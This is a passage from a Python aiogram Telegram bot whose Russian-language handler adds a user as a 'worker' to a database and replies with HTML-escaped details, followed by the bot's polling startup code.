                    first_name = chat_member.first_name or "Неизвестно"
                    worker_name = str(first_name) if first_name else "Неизвестно"
                    if chat_member.last_name:
                        worker_name += f" {str(chat_member.last_name)}"
                    worker_username = f"@{chat_member.username}" if chat_member.username else "Нет username"
                    
                    # Создаем пользователя в базе данных
                    db.get_or_create_user(
                        telegram_id=worker_id,
                        username=chat_member.username,
                        first_name=chat_member.first_name,
                        last_name=chat_member.last_name
                    )
                except Exception as e:
                    logger.warning(f"Не удалось получить информацию о пользователе {worker_id}: {e}")
                    # Создаем пользователя с минимальной информацией
                    db.get_or_create_user(telegram_id=worker_id)
                    worker_name = "Неизвестно"
                    worker_username = "Нет username"
        else:
            await message.answer(
                "❌ Неверный формат. Отправьте Telegram ID числом или перешлите сообщение от пользователя."
            )
            return
        
        # Добавляем воркера
        if db.add_worker(worker_id):
            # Проверяем, что worker_name и worker_username не None
            if not worker_name:
                worker_name = "Неизвестно"
            if not worker_username:
                worker_username = "Нет username"
            
            # Используем HTML для безопасного форматирования
            from html import escape as html_escape
            escaped_name = html_escape(str(worker_name))
            escaped_username = html_escape(str(worker_username))
            await message.answer(
                f"✅ <b>Воркер успешно добавлен!</b>\n\n"
                f"👤 <b>Имя:</b> {escaped_name}\n"
                f"🆔 <b>Username:</b> {escaped_username}\n"
                f"🔢 <b>ID:</b> <code>{worker_id}</code>",
                parse_mode="HTML"
            )
        else:
            await message.answer("❌ Ошибка при добавлении воркера.")
        
        # Очищаем состояние
        await state.clear()
        
    except ValueError:
        await message.answer(
            "❌ Неверный формат ID. Отправьте корректный Telegram ID числом."
        )
    except Exception as e:
        logger.error(f"Ошибка в handle_worker_id_input: {e}")
        await message.answer("❌ Произошла ошибка при добавлении воркера.")
        await state.clear()

async def main():
    try:
        if not Config.validate():
            return
        bot_info = await bot.get_me()
        logger.info(f"Бот запущен: @{bot_info.username}")
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()
if __name__ == "__main__":
    asyncio.run(main())